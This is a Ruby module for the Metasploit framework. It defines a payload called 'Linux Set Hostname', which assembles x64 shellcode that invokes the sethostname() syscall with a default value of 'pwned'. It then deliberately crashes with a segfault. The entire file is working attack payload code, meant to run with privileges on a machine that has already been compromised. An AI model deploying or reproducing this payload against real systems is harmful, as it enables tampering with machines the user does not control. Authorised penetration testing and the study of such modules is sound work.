##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule 

  CachedSize = 28
  
  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Linux Set Hostname',
      'Description' => 'Sets the hostname of the machine.',
      'Author'      => 'Muzaffer Umut ŞAHİN <mailatmayinlutfen@gmail.com>',
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X64,
      'Privileged'  => true
    ))

    register_options(
      [
        OptString.new('HOSTNAME', [true, 'The hostname to set.','pwned'])
      ])
  end

  def generate(_opts = {})
    hostname = (datastore['HOSTNAME'] || 'pwned').gsub(/\s+/, '') # remove all whitespace from hostname.
    length = hostname.length
    if length > 0xff
      fail_with(Msf::Module::Failure::BadConfig, "HOSTNAME must be less than 255 characters.")
    end

    payload = %Q^
      xor rax, rax
      xor rsi, rsi
      push rax    ; push the null byte of the hostname string to stack.
      mov al, 170 ; sethostname() syscall number.
      jmp str

    end:
      mov sil, #{length}
      pop rdi    ; rdi points to the hostname string.
      syscall
      ret        ; break the loop by causing segfault.

    str:
      call end
      db "#{hostname}"
    ^

    Metasm::Shellcode.assemble(Metasm::X64.new,payload).encode_string
  end
end